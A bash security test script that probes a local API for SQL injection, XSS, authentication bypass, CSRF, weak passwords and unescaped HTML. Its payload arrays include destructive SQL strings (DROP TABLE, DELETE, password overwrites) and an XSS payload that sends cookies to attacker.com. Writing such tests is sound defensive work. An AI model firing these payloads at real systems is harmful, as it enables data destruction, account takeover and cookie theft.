#!/bin/bash
# filepath: test_security.sh

set -e  # Exit on error

# API endpoint
API_URL="https://localhost:3443/api"

# Skip SSL verification for local testing
CURL_OPTS="-s -k"  # -s for silent, -k to ignore SSL certificate issues

# Color outputs
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Test user credentials
NORMAL_USERNAME="testuserXYZ"
NORMAL_PASSWORD="Password123"

# Store authentication token after login
AUTH_TOKEN=""

# Helper function to print messages
print_message() {
  echo -e "${BLUE}[INFO]${NC} $1"
}

# Helper function to print success messages
print_success() {
  echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# Helper function to print error messages
print_error() {
  echo -e "${RED}[ERROR]${NC} $1"
}

# Helper function to print warnings
print_warning() {
  echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Helper function to parse JSON with error handling
parse_json() {
  python3 -c "import sys, json; print(json.load(sys.stdin)$1)" 2>/dev/null || echo ""
}

# Setup: Create a normal user for authentication
setup_normal_user() {
  print_message "Setting up a normal test user..."
  
  # Try to login first, in case the user exists
  local response=$(curl $CURL_OPTS -X POST -H "Content-Type: application/json" \
    -d "{\"username\":\"$NORMAL_USERNAME\", \"password\":\"$NORMAL_PASSWORD\"}" \
    $API_URL/users/login)
    
  AUTH_TOKEN=$(echo $response | parse_json "['token']")
  
  if [ -z "$AUTH_TOKEN" ]; then
    # User doesn't exist or couldn't log in, try to register
    print_message "Registering new user..."
    curl $CURL_OPTS -X POST -H "Content-Type: application/json" \
      -d "{\"username\":\"$NORMAL_USERNAME\", \"password\":\"$NORMAL_PASSWORD\"}" \
      $API_URL/users/register > /dev/null
      
    # Try login again
    local login_response=$(curl $CURL_OPTS -X POST -H "Content-Type: application/json" \
      -d "{\"username\":\"$NORMAL_USERNAME\", \"password\":\"$NORMAL_PASSWORD\"}" \
      $API_URL/users/login)
      
    AUTH_TOKEN=$(echo $login_response | parse_json "['token']")
  fi
  
  if [ ! -z "$AUTH_TOKEN" ]; then
    print_success "Successfully authenticated test user"
  else
    print_error "Failed to authenticate test user"
    exit 1
  fi
}

# Test SQL Injection in user registration
test_sql_injection_register() {
  print_message "Testing SQL Injection in user registration..."
  
  local test_cases=(
    "user'; DROP TABLE users; --"
    "admin'); DELETE FROM users; --"
    "user\" OR \"1\"=\"1"
    "user\"); INSERT INTO users (username, password) VALUES ('hacker', 'hacked'); --"
    "user'); UPDATE users SET password='hacked' WHERE username='admin'; --"
  )
  
  for payload in "${test_cases[@]}"; do
    print_message "Testing payload: $payload"
    
    local response=$(curl $CURL_OPTS -X POST -H "Content-Type: application/json" \
      -d "{\"username\":\"$payload\", \"password\":\"Password123\"}" \
      $API_URL/users/register)
      
    if echo $response | grep -q "error"; then
      print_success "Server rejected SQL injection attempt"
    else
      print_warning "Server accepted potentially dangerous username: $payload"
      echo $response
    fi
    
    sleep 1
  done
}

# Test SQL Injection in login
test_sql_injection_login() {
  print_message "Testing SQL Injection in login..."
  
  local test_cases=(
    "admin' --"
    "admin' OR '1'='1"
    "' OR '1'='1"
    "' OR 1=1 --"
    "\' OR username LIKE '%admin%"
  )
  
  for payload in "${test_cases[@]}"; do
    print_message "Testing payload: $payload"
    
    local response=$(curl $CURL_OPTS -X POST -H "Content-Type: application/json" \
      -d "{\"username\":\"$payload\", \"password\":\"anything\"}" \
      $API_URL/users/login)
      
    if echo $response | grep -q "token"; then
      print_error "POSSIBLE SQL INJECTION: Received token with injection payload"
      echo $response
    else
      print_success "Server rejected SQL injection attempt"
    fi
    
    sleep 1
  done
}

# Test XSS in profile update
test_xss_profile_update() {
  print_message "Testing XSS in profile update..."
  
  local test_cases=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "\"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
    "javascript:alert('XSS')"
    "<svg/onload=alert('XSS')>"
  )
  
  for payload in "${test_cases[@]}"; do
    print_message "Testing payload: $payload"
    
    local response=$(curl $CURL_OPTS -X PUT -H "Content-Type: application/json" \
      -H "Authorization: Bearer $AUTH_TOKEN" \
      -d "{\"username\":\"$payload\"}" \
      $API_URL/users/profile)
      
    if echo $response | grep -q "error"; then
      print_success "Server rejected XSS attempt"
    else
      print_warning "Server accepted potentially dangerous username with XSS payload"
      echo $response
    fi
    
    sleep 1
  done
}

# Test SQL injection in GET parameters
test_sql_injection_get_params() {
  print_message "Testing SQL Injection in GET parameters..."
  
  local test_cases=(
    "1 OR 1=1"
    "1; DROP TABLE users; --"
    "1 UNION SELECT username, password FROM users"
    "1' OR '1'='1"
    "-1' UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM users --"
  )
  
  for payload in "${test_cases[@]}"; do
    print_message "Testing payload: $payload"
    
    # URL encode the payload
    local encoded_payload=$(echo $payload | sed 's/ /%20/g; s/=/%3D/g; s/;/%3B/g')
    
    local response=$(curl $CURL_OPTS -H "Authorization: Bearer $AUTH_TOKEN" \
      "$API_URL/users/$encoded_payload")
      
    if echo $response | grep -q "error"; then
      print_success "Server rejected SQL injection attempt in GET parameter"
    else
      # If we get multiple user records, that could indicate SQL injection worked
      local user_count=$(echo $response | grep -o "username" | wc -l)
      if [ "$user_count" -gt 1 ]; then
        print_error "POSSIBLE SQL INJECTION: Received multiple user records"
        echo $response
      else
        print_success "No evidence of successful SQL injection in GET parameter"
      fi
    fi
    
    sleep 1
  done
}

# Test SQL injection in URL path parameters (by-username)
test_sql_injection_url_path() {
  print_message "Testing SQL Injection in URL path parameters..."
  
  local test_cases=(
    "admin'--"
    "admin' OR '1'='1"
    "' UNION SELECT * FROM users --"
    "anything' OR username IS NOT NULL; --"
    "%' OR username LIKE '%"
  )
  
  for payload in "${test_cases[@]}"; do
    print_message "Testing payload: $payload"
    
    # URL encode the payload
    local encoded_payload=$(echo $payload | sed 's/ /%20/g; s/=/%3D/g; s/;/%3B/g; s/\\//%5C/g')
    
    local response=$(curl $CURL_OPTS -H "Authorization: Bearer $AUTH_TOKEN" \
      "$API_URL/users/by-username/$encoded_payload")
      
    if echo $response | grep -q "error"; then
      print_success "Server rejected SQL injection attempt in URL path"
    else
      # Check for multiple results which could indicate successful injection
      local field_count=$(echo $response | grep -o ":" | wc -l)
      if [ "$field_count" -gt 10 ]; then  # Arbitrary threshold
        print_error "POSSIBLE SQL INJECTION: Response contains many fields"
        echo $response | cut -c 1-200  # Print first 200 chars to avoid overwhelming output
      else
        print_success "No evidence of successful SQL injection in URL path"
      fi
    fi
    
    sleep 1
  done
}

# Test for authentication bypass
test_auth_bypass() {
  print_message "Testing authentication bypass attempts..."
  
  local endpoints=(
    "/users/stats"
    "/users/profile"
    "/users/match-history"
    "/users/friends"
    "/users/export-data"
  )
  
  for endpoint in "${endpoints[@]}"; do
    print_message "Testing unauthorized access to $endpoint"
    
    # Test with no token
    local response=$(curl $CURL_OPTS $API_URL$endpoint)
    
    if echo $response | grep -q "error\|unauthorized\|Unauthorized"; then
      print_success "Endpoint $endpoint properly requires authentication"
    else
      print_error "SECURITY ISSUE: Endpoint $endpoint may be accessible without authentication"
      echo $response | cut -c 1-100
    fi
    
    # Test with invalid token
    local response=$(curl $CURL_OPTS -H "Authorization: Bearer invalid_token_here" $API_URL$endpoint)
    
    if echo $response | grep -q "error\|unauthorized\|Unauthorized"; then
      print_success "Endpoint $endpoint rejects invalid tokens"
    else
      print_error "SECURITY ISSUE: Endpoint $endpoint accepts invalid tokens"
      echo $response | cut -c 1-100
    fi
    
    sleep 1
  done
}

# Test for CSRF protection
test_csrf_protection() {
  print_message "Testing CSRF protection..."
  
  # Test changing password without proper headers
  local response=$(curl $CURL_OPTS -X PUT \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -d "{\"currentPassword\":\"$NORMAL_PASSWORD\",\"newPassword\":\"NewPassword123\"}" \
    $API_URL/users/password)
    
  if echo $response | grep -q "error"; then
    print_success "Server requires proper Content-Type header (potential CSRF protection)"
  else
    print_warning "Server accepted request without Content-Type header (potential CSRF vulnerability)"
    echo $response
  fi
  
  # Test with modified origin/referer
  local response=$(curl $CURL_OPTS -X PUT \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -H "Origin: http://evil-site.com" \
    -H "Referer: http://evil-site.com/csrf.html" \
    -d "{\"currentPassword\":\"$NORMAL_PASSWORD\",\"newPassword\":\"NewPassword123\"}" \
    $API_URL/users/password)
    
  # Just check if it was accepted - modern APIs often don't check origin/referer
  print_message "Request with modified origin/referer response: "
  echo $response | grep -o "success\|error"
  
  sleep 1
}

# Test for password security
test_password_security() {
  print_message "Testing password security requirements..."
  
  local weak_passwords=(
    "password"
    "123456"
    "qwerty"
    "letmein"
    "abcdef"
    "ALLCAPS"
    "12345678"
    "password123"  # No uppercase
    "Password"     # No digit
    "12345678A"    # No lowercase
  )
  
  for password in "${weak_passwords[@]}"; do
    print_message "Testing weak password: $password"
    
    local response=$(curl $CURL_OPTS -X POST -H "Content-Type: application/json" \
      -d "{\"username\":\"weakuser_${RANDOM}\", \"password\":\"$password\"}" \
      $API_URL/users/register)
      
    if echo $response | grep -q "error\|weak"; then
      print_success "Server rejected weak password"
    else
      print_warning "Server accepted potentially weak password: $password"
      echo $response
    fi
    
    sleep 1
  done
  
  # Test password change with weak password
  local response=$(curl $CURL_OPTS -X PUT -H "Content-Type: application/json" \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -d "{\"currentPassword\":\"$NORMAL_PASSWORD\",\"newPassword\":\"password\"}" \
    $API_URL/users/password)
    
  if echo $response | grep -q "error\|weak"; then
    print_success "Server rejected weak password change"
  else
    print_warning "Server allowed changing to a weak password"
    echo $response
  fi
  
  sleep 1
}

# Test for HTML content in API responses
test_html_in_responses() {
  print_message "Testing for HTML injection in API responses..."
  
  # First create a user with HTML in username (if it gets accepted)
  local html_username="user<div>html</div>"
  
  curl $CURL_OPTS -X POST -H "Content-Type: application/json" \
    -d "{\"username\":\"$html_username\", \"password\":\"Password123\"}" \
    $API_URL/users/register > /dev/null
    
  # Now try to get user list and see if HTML is escaped in response
  local response=$(curl $CURL_OPTS -H "Authorization: Bearer $AUTH_TOKEN" \
    $API_URL/users)
    
  if echo $response | grep -q "<div>html</div>"; then
    print_warning "Server may be returning unescaped HTML in responses"
  else
    print_success "No unescaped HTML found in responses"
  fi
  
  sleep 1
}

# Cleanup after tests
cleanup() {
  print_message "Cleaning up test user..."
  
  if [ ! -z "$AUTH_TOKEN" ]; then
    # Delete the test user
    curl $CURL_OPTS -X DELETE -H "Authorization: Bearer $AUTH_TOKEN" \
      $API_URL/users/account > /dev/null
    print_message "Test user deleted"
  fi
}

# Run all tests
run_security_tests() {
  print_message "Starting security testing of API endpoints..."
  echo "============================================="
  
  setup_normal_user
  sleep 1
  
  test_sql_injection_register
  sleep 1
  
  test_sql_injection_login
  sleep 1
  
  test_xss_profile_update
  sleep 1
  
  test_sql_injection_get_params
  sleep 1
  
  test_sql_injection_url_path
  sleep 1
  
  test_auth_bypass
  sleep 1
  
  test_csrf_protection
  sleep 1
  
  test_password_security
  sleep 1
  
  test_html_in_responses
  sleep 1
  
  cleanup
  
  echo "============================================="
  print_message "Security tests completed. Please review the results carefully."
  print_message "Note: These tests provide basic security checks and should be supplemented with professional security testing."
}

# Execute the tests
run_security_tests